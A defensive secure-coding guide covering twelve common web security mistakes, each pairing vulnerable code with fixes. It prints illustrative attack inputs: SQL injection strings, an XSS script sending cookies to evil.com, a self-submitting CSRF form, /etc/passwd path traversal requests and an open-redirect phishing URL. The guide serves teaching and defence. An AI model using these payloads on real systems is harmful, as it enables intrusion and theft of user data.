# Sharp Edges: Cybersecurity

Critical security mistakes that lead to breaches, data loss, and regulatory nightmares.

---

## 1. The Hardcoded Secret

**Severity:** Critical
**Situation:** Credentials, API keys, or secrets committed to source code
**Why Dangerous:** Secrets in code get into version history, logs, and attacker hands.

```
THE TRAP:
// "Just for development"
const API_KEY = 'sk_live_abc123xyz789'
const DB_PASSWORD = 'production_password_2024'

// "I'll remove it before pushing"
git commit -m "Add feature"
git push origin main

// Secret is now in:
- Git history (forever)
- GitHub/GitLab servers
- Developer machines (clones)
- CI/CD logs
- Backup systems

THE REALITY:
Git history is forever.
Removing from latest commit ≠ removed.
Bot scanners find secrets in seconds.
One exposed key = full breach.

WHAT GETS LEAKED:
- AWS access keys
- Database passwords
- API keys (Stripe, Twilio, etc.)
- OAuth secrets
- JWT signing keys
- Encryption keys

THE FIX:
1. Use environment variables
   const apiKey = process.env.API_KEY

2. Use secrets managers
   const { data } = await vault.read('secret/api-key')

3. Use .gitignore properly
   .env
   .env.local
   *.pem
   secrets/

4. Pre-commit hooks
   # .pre-commit-config.yaml
   - repo: https://github.com/gitleaks/gitleaks
     hooks:
       - id: gitleaks

5. If already leaked:
   - Rotate immediately (new credentials)
   - Old ones are compromised
   - History cleanup is not enough

TOOLS:
- gitleaks: Pre-commit scanning
- trufflehog: History scanning
- git-secrets: AWS-focused
- Doppler/Vault: Secrets management
```

---

## 2. The SQL Injection Opening

**Severity:** Critical
**Situation:** Building SQL queries with string concatenation
**Why Dangerous:** Attackers can read, modify, or delete entire databases.

```
THE TRAP:
// Direct string concatenation
const query = `SELECT * FROM users WHERE id = ${userId}`
const query = "SELECT * FROM users WHERE name = '" + name + "'"

// What happens with malicious input:
userId = "1; DROP TABLE users;--"
name = "'; DELETE FROM users WHERE '1'='1"

// Attacker now controls your database

THE REALITY:
SQL injection is #1 on OWASP Top 10.
It's fully preventable.
One vulnerable endpoint = full database access.
Automated tools find and exploit in minutes.

INJECTION PATTERNS:
- Read all data: ' OR '1'='1
- Delete data: '; DROP TABLE users;--
- Bypass auth: ' OR 1=1--
- Time-based blind: '; WAITFOR DELAY '0:0:5'--

THE FIX:
1. Parameterized queries (ALWAYS)
   // Node/PostgreSQL
   const { rows } = await pool.query(
     'SELECT * FROM users WHERE id = $1',
     [userId]
   )

   // With ORM (Prisma)
   const user = await prisma.user.findUnique({
     where: { id: userId }
   })

2. Never concatenate user input
   // NEVER
   `SELECT * FROM users WHERE id = ${userInput}`

   // ALWAYS
   query('SELECT * FROM users WHERE id = $1', [userInput])

3. Use ORM for most queries
   ORMs parameterize by default.
   Raw SQL only when necessary.

4. Input validation (defense in depth)
   if (!isValidUUID(userId)) {
     throw new ValidationError()
   }

5. Least privilege database user
   App DB user should NOT have DROP, GRANT permissions
```

---

## 3. The XSS Vulnerability

**Severity:** Critical
**Situation:** Rendering untrusted data without proper encoding
**Why Dangerous:** Attackers can steal sessions, credentials, and execute code as users.

```
THE TRAP:
// Dangerous: Direct HTML insertion
element.innerHTML = userComment
dangerouslySetInnerHTML={{ __html: userContent }}
document.write(userData)

// Attacker input:
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>

// Result:
- Session cookies stolen
- Keyloggers installed
- Phishing content injected
- Cryptocurrency miners
- Malware distribution

THE REALITY:
XSS is #2 on OWASP Top 10.
Can be as dangerous as full database access.
Affects every user who views the content.
Persisted XSS hits everyone.

XSS TYPES:
Stored: Saved in database, affects all viewers
Reflected: In URL, affects clicked links
DOM-based: Client-side only, in JavaScript

THE FIX:
1. Use framework escaping (React, Vue)
   // React auto-escapes
   <div>{userContent}</div>  // Safe

   // NEVER unless absolutely necessary
   dangerouslySetInnerHTML

2. Encode output for context
   // HTML context
   const safe = escapeHtml(userInput)

   // URL context
   const safe = encodeURIComponent(userInput)

   // JavaScript context
   const safe = JSON.stringify(userInput)

3. Content Security Policy
   Content-Security-Policy: default-src 'self';
     script-src 'self';
     style-src 'self' 'unsafe-inline'

4. Sanitize HTML if required
   import DOMPurify from 'dompurify'
   const clean = DOMPurify.sanitize(dirty)

5. HTTPOnly cookies
   Set-Cookie: session=abc; HttpOnly; Secure

NEVER:
- innerHTML with user content
- eval() with user content
- document.write() with user content
- v-html in Vue with user content
```

---

## 4. The Missing Authentication

**Severity:** Critical
**Situation:** API endpoints or pages accessible without authentication
**Why Dangerous:** Anyone can access protected resources.

```
THE TRAP:
// Frontend checks but API doesn't
// Frontend:
if (user.isAdmin) {
  showAdminPanel()
}

// API:
app.get('/api/admin/users', (req, res) => {
  // No auth check!
  return getAllUsers()
})

// Attacker:
curl https://app.com/api/admin/users
// Returns all user data

THE REALITY:
Frontend is not a security boundary.
Anyone can call your API directly.
Every endpoint needs authentication.
"Hidden" URLs are not secure.

COMMON GAPS:
- Admin endpoints without auth
- API endpoints assuming frontend auth
- File download endpoints
- Webhook endpoints
- Internal APIs exposed

THE FIX:
1. Auth on every protected endpoint
   app.get('/api/admin/users', authMiddleware, (req, res) => {
     // Now protected
   })

2. Default deny
   // All routes protected by default
   app.use('/api/*', authMiddleware)

   // Explicitly allow public routes
   app.get('/api/public/*', publicMiddleware)

3. Verify on every request
   // Don't cache auth decisions
   // Check on each request
   const user = await verifyToken(req.headers.authorization)

4. Test with unauthenticated requests
   # Should return 401, not 200
   curl -X GET https://app.com/api/admin/users

5. API inventory
   Document all endpoints.
   Mark which need auth.
   Review regularly.

AUTH CHECKLIST:
□ All admin endpoints protected
□ All data endpoints protected
□ File/media endpoints protected
□ Webhooks verified
□ No auth bypass routes
```

---

## 5. The Missing Authorization

**Severity:** Critical
**Situation:** User can access another user's resources (IDOR/BOLA)
**Why Dangerous:** Users can read/modify other users' data.

```
THE TRAP:
// Authenticated but not authorized
app.get('/api/users/:id', authMiddleware, (req, res) => {
  const userId = req.params.id
  // Missing: Is req.user allowed to access userId?
  return getUser(userId)
})

// Attacker is user ID 1
// Requests: GET /api/users/2
// Gets user 2's data

THE REALITY:
Authentication ≠ Authorization.
"Who are you?" ≠ "What can you access?"
BOLA/IDOR is #1 API security risk.
Easy to exploit, often overlooked.

COMMON PATTERNS:
- GET /users/:id (access any user)
- GET /orders/:id (access any order)
- PUT /accounts/:id (modify any account)
- DELETE /files/:id (delete any file)

THE FIX:
1. Check ownership on every request
   app.get('/api/orders/:id', auth, async (req, res) => {
     const order = await getOrder(req.params.id)

     if (order.userId !== req.user.id) {
       return res.status(403).json({ error: 'Forbidden' })
     }

     return res.json(order)
   })

2. Scope queries to user
   // Instead of: getOrder(orderId)
   // Use: getUserOrder(userId, orderId)

   const order = await prisma.order.findFirst({
     where: {
       id: orderId,
       userId: req.user.id  // Scoped
     }
   })

3. Use UUIDs not sequential IDs
   // Sequential: Easy to enumerate
   /orders/1, /orders/2, /orders/3

   // UUID: Hard to guess
   /orders/550e8400-e29b-41d4-a716-446655440000

4. Role-based access
   if (!req.user.can('read', 'User', userId)) {
     return res.status(403).json({ error: 'Forbidden' })
   }

AUTHORIZATION CHECKLIST:
□ Every resource access checks ownership
□ Admin actions check admin role
□ Org resources check org membership
□ No sequential ID enumeration possible
```

---

## 6. The Insecure Password Storage

**Severity:** Critical
**Situation:** Passwords stored in plaintext, weak hashing, or reversible encryption
**Why Dangerous:** Database breach exposes all user credentials.

```
THE TRAP:
// Plaintext (worst)
user.password = req.body.password

// MD5/SHA1 (broken)
user.password = md5(req.body.password)

// SHA256 without salt (vulnerable to rainbow tables)
user.password = sha256(req.body.password)

// Reversible encryption (still recoverable)
user.password = encrypt(req.body.password, key)

THE REALITY:
Databases get breached.
Assume your password table will be stolen.
Proper hashing is the last line of defense.
Weak hashing = millions of accounts compromised.

THE FIX:
1. Use bcrypt, argon2, or scrypt
   import bcrypt from 'bcrypt'

   // Hash password (on signup/change)
   const hash = await bcrypt.hash(password, 12)  // 12 rounds

   // Verify password (on login)
   const valid = await bcrypt.compare(password, hash)

2. Never store plaintext
   Even temporarily.
   Even in logs.
   Even in error messages.

3. Use high work factor
   // bcrypt: 10-12 rounds
   // argon2: memory 64MB, iterations 3

   Higher = slower attacks
   But also slower logins

4. Use password library
   Don't implement yourself.
   Use proven libraries.

5. Consider password requirements
   - Minimum length (12+)
   - Check against breach lists
   - Don't require complex rules
   - Allow paste (password managers)

HASHING ALGORITHMS:
✓ bcrypt (battle-tested)
✓ argon2id (modern, recommended)
✓ scrypt (high memory)
✗ MD5 (broken)
✗ SHA1 (broken)
✗ SHA256 alone (rainbow tables)
```

---

## 7. The CSRF Vulnerability

**Severity:** High
**Situation:** State-changing requests without CSRF protection
**Why Dangerous:** Attackers can perform actions as authenticated users.

```
THE TRAP:
// User is logged into bank.com
// User visits evil.com

// evil.com contains:
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker" />
  <input name="amount" value="10000" />
</form>
<script>document.forms[0].submit()</script>

// Browser sends cookies automatically
// Transfer happens as user

THE REALITY:
Browsers send cookies with every request.
Including requests from other sites.
User doesn't have to click anything.
One visit to malicious site = attack.

CSRF ATTACK SURFACE:
- Form submissions
- POST/PUT/DELETE requests
- Any state-changing operation
- Especially financial/sensitive

THE FIX:
1. CSRF tokens
   // Generate per session
   const csrfToken = generateCsrfToken()
   req.session.csrf = csrfToken

   // Include in forms
   <input type="hidden" name="_csrf" value="${csrfToken}" />

   // Validate on submission
   if (req.body._csrf !== req.session.csrf) {
     throw new Error('CSRF validation failed')
   }

2. SameSite cookies
   Set-Cookie: session=abc; SameSite=Lax; Secure; HttpOnly

3. Custom headers for AJAX
   // AJAX requests from other origins can't set custom headers
   fetch('/api/action', {
     headers: { 'X-CSRF-Token': token }
   })

4. Origin header checking
   const origin = req.get('Origin')
   if (!allowedOrigins.includes(origin)) {
     throw new Error('Invalid origin')
   }

5. Framework protections
   Most frameworks have CSRF middleware.
   Use it.

CSRF PROTECTION LEVELS:
- Token in forms (traditional)
- SameSite=Lax cookies (modern default)
- SameSite=Strict (most secure)
- Double submit cookie pattern
```

---

## 8. The Broken Session Management

**Severity:** High
**Situation:** Sessions that are predictable, never expire, or improperly invalidated
**Why Dangerous:** Sessions can be hijacked, reused, or remain active forever.

```
THE TRAP:
// Predictable session IDs
sessionId = `user_${userId}_${timestamp}`
// Attacker can guess: user_1234_1705123456

// Sessions never expire
const session = createSession({ expiresIn: null })

// Sessions not invalidated on logout
app.post('/logout', (req, res) => {
  res.clearCookie('session')  // Client side only!
  // Session still valid on server
})

// Session not rotated after auth
// Pre-auth session ID reused after login
// Session fixation vulnerability

THE REALITY:
Sessions are the keys to the kingdom.
Weak sessions = account takeover.
Stale sessions = persistent access.
Poor logout = sessions live forever.

THE FIX:
1. Cryptographically random session IDs
   import { randomBytes } from 'crypto'
   const sessionId = randomBytes(32).toString('hex')

2. Set appropriate expiration
   const session = createSession({
     expiresIn: '1h',           // Absolute
     inactiveTimeout: '15m'     // Inactivity
   })

3. Invalidate on logout (server-side)
   app.post('/logout', (req, res) => {
     await destroySession(req.sessionId)  // Server invalidation
     res.clearCookie('session')
   })

4. Rotate session after authentication
   app.post('/login', async (req, res) => {
     const user = await authenticate(req.body)

     // Destroy old session
     await destroySession(req.sessionId)

     // Create new session
     const newSession = await createSession(user.id)

     res.cookie('session', newSession.id)
   })

5. Invalidate on sensitive changes
   On password change: Invalidate all sessions
   On permission change: Invalidate sessions
   On suspicious activity: Invalidate sessions

SESSION CHECKLIST:
□ Random, unpredictable IDs
□ Expiration set (absolute and inactive)
□ Server-side invalidation on logout
□ Session rotation on auth
□ Secure cookie flags (HttpOnly, Secure, SameSite)
```

---

## 9. The Exposed Error Details

**Severity:** High
**Situation:** Detailed error messages, stack traces, or debug info in production
**Why Dangerous:** Helps attackers understand your system and find vulnerabilities.

```
THE TRAP:
// In production:
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack,
    query: req.query,
    sqlQuery: err.sql,
    config: process.env
  })
})

// Attacker sees:
{
  "error": "ER_DUP_ENTRY: Duplicate entry 'admin' for key 'users.email'",
  "stack": "at Query.Sequence._packetToError (mysql/lib/...)",
  "sqlQuery": "INSERT INTO users (email, role) VALUES ('admin', 'admin')",
  "config": { "DB_PASSWORD": "prod123", ... }
}

THE REALITY:
Error details reveal:
- Database schema
- Technology stack
- File paths
- Configuration
- Credentials
- Valid usernames/data

THE FIX:
1. Generic errors in production
   app.use((err, req, res, next) => {
     // Log full error internally
     logger.error(err)

     // Return generic message
     if (process.env.NODE_ENV === 'production') {
       return res.status(500).json({
         error: 'An error occurred',
         requestId: req.id  // For support
       })
     }

     // Details in development only
     return res.status(500).json({
       error: err.message,
       stack: err.stack
     })
   })

2. Don't leak in validation errors
   // Bad
   "Password must match user admin@company.com"

   // Good
   "Invalid credentials"

3. Consistent error responses
   // Don't reveal if user exists
   // Bad: "No user with that email"
   // Bad: "Incorrect password"
   // Good: "Invalid email or password"

4. Hide headers
   app.disable('x-powered-by')

   Server: nginx  // Not "Express 4.17.1"

5. Log internally, not externally
   Errors go to logging system.
   Not to response body.
```

---

## 10. The Insecure Direct Object Reference

**Severity:** High
**Situation:** Using user-supplied identifiers without validation
**Why Dangerous:** Path traversal, arbitrary file access, data exposure.

```
THE TRAP:
// File download
app.get('/download', (req, res) => {
  const file = req.query.file
  res.download(`/uploads/${file}`)
})

// Attacker request:
GET /download?file=../../../etc/passwd
GET /download?file=../../config/database.yml

// Result: Server files exposed

// Template inclusion
const template = req.query.template
res.render(`templates/${template}`)

// Attacker request:
GET /page?template=../../../etc/passwd

THE REALITY:
User input should never be used in:
- File paths
- Template names
- Include statements
- Database table names

THE FIX:
1. Whitelist allowed values
   const allowedTemplates = ['home', 'about', 'contact']

   if (!allowedTemplates.includes(req.query.template)) {
     return res.status(400).json({ error: 'Invalid template' })
   }

2. Map to safe values
   const fileMap = {
     'report': '/uploads/report.pdf',
     'invoice': '/uploads/invoice.pdf'
   }

   const file = fileMap[req.query.file]
   if (!file) return res.status(404)

3. Validate paths
   const path = require('path')

   const requestedPath = path.join('/uploads', req.query.file)
   const resolvedPath = path.resolve(requestedPath)

   if (!resolvedPath.startsWith('/uploads/')) {
     return res.status(403).json({ error: 'Access denied' })
   }

4. Indirect references
   // Instead of: /files/secret_report.pdf
   // Use: /files/a1b2c3d4-uuid
   // Map internally to actual file

5. Principle of least access
   Process runs with minimal file system access.
   Can only read from intended directories.
```

---

## 11. The Weak Cryptography

**Severity:** High
**Situation:** Using deprecated algorithms or implementing crypto incorrectly
**Why Dangerous:** Encryption can be broken, data exposed.

```
THE TRAP:
// Weak algorithms
const encrypted = crypto.createCipher('des', key)  // DES is broken
const hash = crypto.createHash('md5')  // MD5 is broken

// ECB mode (patterns visible)
crypto.createCipheriv('aes-256-ecb', key, null)

// Predictable IVs
const iv = Buffer.from('0000000000000000')

// Hardcoded keys
const key = 'my-secret-encryption-key-12345'

THE REALITY:
Crypto is hard.
One mistake = no security.
Deprecated algorithms are deprecated for a reason.
Custom crypto is almost always wrong.

THE FIX:
1. Use modern algorithms
   // Symmetric: AES-256-GCM
   const cipher = crypto.createCipheriv(
     'aes-256-gcm',
     key,
     iv
   )

   // Asymmetric: RSA-OAEP with 2048+ bits
   // Or: Ed25519, X25519

   // Hashing: SHA-256, SHA-3
   // Password: bcrypt, argon2id

2. Use proper modes
   // GCM provides encryption + authentication
   'aes-256-gcm'  // Good
   'aes-256-cbc'  // Okay with HMAC
   'aes-256-ecb'  // Never

3. Random IVs
   const iv = crypto.randomBytes(16)
   // Store IV with ciphertext (it's not secret)

4. Use libraries
   // Node.js: libsodium, tweetnacl
   // Web: Web Crypto API
   // Don't implement yourself

5. Key management
   // Don't hardcode keys
   // Use key derivation for passwords
   // Rotate keys periodically
   // Store keys securely (HSM, KMS)

CRYPTO CHECKLIST:
□ AES-256-GCM or ChaCha20-Poly1305
□ Random IVs for each encryption
□ Keys from secure key store
□ HTTPS for transport
□ Certificate pinning for mobile
□ No deprecated algorithms
```

---

## 12. The Unvalidated Redirect

**Severity:** Medium
**Situation:** Redirecting users based on user-supplied URLs
**Why Dangerous:** Phishing attacks, credential theft, malware distribution.

```
THE TRAP:
// Open redirect
app.get('/redirect', (req, res) => {
  res.redirect(req.query.url)
})

// Legitimate use:
/redirect?url=/dashboard

// Attacker use:
/redirect?url=https://evil.com/fake-login

// User sees: yoursite.com/redirect?url=...
// Trusts it because it's your domain
// Gets redirected to phishing site

THE REALITY:
Open redirects enable:
- Phishing (fake login pages)
- Malware distribution
- OAuth token theft
- Trust exploitation

"It's just a redirect" = underestimated risk

THE FIX:
1. Whitelist allowed destinations
   const allowedRedirects = [
     '/dashboard',
     '/settings',
     '/logout'
   ]

   if (!allowedRedirects.includes(req.query.url)) {
     return res.redirect('/')
   }

2. Validate URL is internal
   function isInternalUrl(url) {
     try {
       const parsed = new URL(url, 'https://yoursite.com')
       return parsed.hostname === 'yoursite.com'
     } catch {
       return false
     }
   }

3. Use indirect references
   // Instead of: /redirect?url=https://...
   // Use: /redirect?target=dashboard
   // Map 'dashboard' to internal URL

4. Add warning for external
   if (isExternal(url)) {
     res.render('external-warning', { url })
   }

5. No URL in parameters
   // Instead of passing URL
   // Pass action/target name
   // Resolve URL on server

REDIRECT SAFETY:
□ No full URLs in parameters
□ Whitelist allowed destinations
□ Validate same-origin
□ Warn for external links
□ Log redirect requests
```
